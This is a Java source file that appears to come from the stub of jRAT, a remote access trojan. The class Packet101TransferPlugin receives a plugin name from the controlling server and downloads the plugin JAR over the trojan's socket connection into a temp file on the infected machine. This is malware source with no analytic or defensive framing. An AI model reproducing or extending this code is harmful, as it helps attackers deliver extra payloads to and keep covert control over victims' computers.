package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.io.FileIO;
import se.jrat.stub.Connection;
import se.jrat.stub.Main;


public class Packet101TransferPlugin extends AbstractIncomingPacket {
	
	public Packet101TransferPlugin() {
	
	}

	@Override
	public void read() throws Exception {
		System.out.print("Downloading plugin ");

		String name = Connection.readLine();		
		
		System.out.println(name);
		
		File file = File.createTempFile(name, ".jar");
		
		FileIO io = new FileIO();
		io.readFile(file, Connection.socket, Connection.dis, Connection.dos, null, Main.getKey());
	}
}
